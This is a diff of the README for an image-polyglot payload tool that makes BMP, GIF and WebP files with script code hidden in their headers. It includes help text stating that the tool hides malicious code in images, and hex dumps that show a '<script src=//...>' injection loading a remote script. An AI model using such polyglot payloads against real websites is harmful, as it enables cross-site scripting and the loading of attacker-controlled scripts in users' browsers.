@@ -75,31 +75,38 @@ docker run -v "$(pwd):/pixload" -it --rm pixload
 
 ## TOOLS
 
-### bmp.pl
+### pixload-bmp
 
-BMP Payload Creator/Injector.
-
-Create a minimal BMP Polyglot Image with custom/default payload, or
-inject payload into existing image.
-
-##### Usage
+##### Help
 
 ```sh
-./bmp.pl [-payload 'STRING'] -output payload.bmp
+$ pixload-bmp --help
+```
 
-If the output file exists, then the payload will be injected into the
-existing file.  Else the new one will be created.
+```
+Usage: pixload-bmp [OPTION]... FILE
+Hide Payload/Malicious Code in BMP Images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -P, --payload STRING   set payload for injection
+  -v, --version          print version and exit
+  -h, --help             print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Otherwise, the new one will be created.
 ```
 
 ##### Example
 
 ```sh
-./bmp.pl -output payload.bmp
+$ pixload-bmp payload.bmp
+```
 
-[>|       BMP Payload Creator/Injector      |<]
-
-    https://github.com/chinarulezzz/pixload
-
+```
+......... BMP Payload Creator/Injector ........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
 [>] Generating output file
 [✔] File saved to: payload.bmp
@@ -107,40 +114,58 @@ existing file.  Else the new one will be created.
 [>] Injecting payload into payload.bmp
 [✔] Payload was injected successfully
 
-payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1
+payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26
 
 00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
 00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
 00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
-00000030  2f 6e 6a 69 2e 78 79 7a  3e 3c 2f 73 63 72 69 70  |/nji.xyz></scrip|
-00000040  74 3e 3b                                          |t>;|
-00000043
+00000030  2f 65 78 61 6d 70 6c 65  2e 63 6f 6d 3e 3c 2f 73  |/example.com></s|
+00000040  63 72 69 70 74 3e 3b                              |cript>;|
+00000047
 ```
 
-### gif.pl
+See [pixload-bmp(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-bmp.1.pod)
+manual page for more information.
 
-GIF Payload Creator/Injector.
+### pixload-gif
 
-Create a minimal GIF Polyglot Image with custom/default payload, or
-inject payload into existing image.
-
-##### Usage
+##### Help
 
 ```sh
-./gif.pl [-payload 'STRING'] -output payload.gif
-
-If the output file exists, then the payload will be injected into the
-existing file.  Else the new one will be generated.
+$ pixload-gif --help
 ```
+
+```
+Usage: pixload-gif [OPTION]... FILE
+Hide payload/malicious code in GIF images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -W, --pixelwidth  INTEGER   (has no effect)
+                              set pixel width for the new image (default: 10799)
+  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
+  -P, --payload     STRING    set payload for injection
+  -v, --version               print version and exit
+  -h, --help                  print help and exit
+
+The option -W, --pixelwidth has no effect since pixload-gif rewrites
+pixel width bytes with "/*" characters, to prepare the polyglot gif image.
+
+If the output FILE already exists, then the payload will be injected into this
+existing file. Otherwise, the new one will be created with specified pixels
+wide.
+```
+
 ##### Example
 
 ```sh
-./gif.pl -output payload.gif
+$ pixload-gif payload.gif
+```
 
-[>|      GIF Payload Creator/Injector       |<]
-
-    https://github.com/chinarulezzz/pixload
-
+```
+........ GIF Payload Creator/Injector .........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
 [>] Generating output file
 [✔] File saved to: payload.gif
@@ -155,10 +180,12 @@ payload.gif: GIF image data, version 87a, 10799 x 32
 00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
 00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
 00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
-00000050  2f 2f 6e 6a 69 2e 78 79  7a 3e 3c 2f 73 63 72 69  |//nji.xyz></scri|
-00000060  70 74 3e 3b                                       |pt>;|
-00000064
+00000050  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
+00000060  73 63 72 69 70 74 3e 3b                           |script>;|
+00000068
 ```
+See [pixload-gif(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-gif.1.pod)
+manual page for more information.
 
 ### pixload-jpg
 
@@ -328,33 +355,37 @@ payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced
 See [pixload-png(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod)
 manual page for more information.
 
-### webp.pl
+### pixload-webp
 
-WebP Payload Creator/Injector.
-
-Create a WebP Polyglot Image with custom/default payload, or inject
-payload into existing image.
-
-##### Usage
+##### Help
 
 ```sh
-./webp.pl [-payload 'STRING'] -output payload.webp
+$ pixload-webp --help`
+```
+
+```
+Usage: pixload-webp [OPTION]... FILE
+Hide payloads/malicious code in WebP images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -P, --payload STRING   set payload for injection
+  -v, --version          print version and exit
+  -h, --help             print help and exit
 
 Currently, there is no possibility to inject the payload into an existing
-webp image.  Only the new (minimal) webp image will be created and your
-payload will be injected into.
-
-If the -output argument file exists, the payload will be injected into 
-the existing image, but this image will be corrupted.
+WebP image. Only the new (minimal) WebP image will be created and your
+payload will be injected into. If the output FILE already exists, the
+payload will be injected into the existing image, but this image will be
+corrupted.
 ```
 
 ##### Example
 
-```sh
-[>|      WebP Payload Creator/Injector       |<]
-
-    https://github.com/chinarulezzz/pixload
-
+```
+........ WebP Payload Creator/Injector ........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
 
 [>] Generating output file
 [✔] File saved to: payload.webp
@@ -367,14 +398,16 @@ payload.webp: RIFF (little-endian) data, Web/P image
 00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|
 00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|
 00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;<script s|
-00000030  72 63 3d 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |rc=//nji.xyz></s|
-00000040  63 72 69 70 74 3e 3b                              |cript>;|
-00000047
+00000030  72 63 3d 2f 2f 65 78 61  6d 70 6c 65 2e 63 6f 6d  |rc=//example.com|
+00000040  3e 3c 2f 73 63 72 69 70  74 3e 3b                 |></script>;|
+0000004b
 ```
+
+See [pixload-webp(1)](https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod) manual page for more information.
 
 ## LICENSE
 
-WTFPL
+WTFPL. See [LICENSE](https://github.com/chinarulezzz/pixload/blob/master/LICENSE) for more information.
 
 ## LEGAL DISCLAIMER
 
